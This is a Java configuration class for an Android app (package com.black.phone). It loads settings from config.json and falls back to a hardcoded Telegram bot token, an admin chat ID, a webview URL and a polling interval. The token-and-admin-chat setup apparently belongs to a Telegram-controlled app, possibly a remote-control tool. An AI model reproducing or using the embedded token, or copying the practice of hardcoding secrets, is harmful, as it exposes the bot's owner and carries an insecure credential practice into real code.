package com.black.phone;

import android.content.Context;
import android.content.res.AssetManager;
import com.google.gson.Gson;
import java.io.InputStreamReader;
import java.io.Reader;

public class Config {
    public String bot_token;
    public String admin_chat_id;
    public String webview_url;
    public int poll_interval_sec;

    private static Config instance;

    public static Config get() {
        if (instance == null) throw new RuntimeException("Config not loaded!");
        return instance;
    }

    public static void load(Context ctx) {
        try {
            AssetManager am = ctx.getAssets();
            Reader r = new InputStreamReader(am.open("config.json"));
            instance = new Gson().fromJson(r, Config.class);
            r.close();
        } catch (Exception e) {
            instance = new Config();
            instance.bot_token = "8962511911:AAHYZpdZJVkNif1iF1-3odKTqq2owgDk16M";
            instance.admin_chat_id = "6793813126";
            instance.webview_url = "https://www.google.com";
            instance.poll_interval_sec = 5;
        }
    }
}
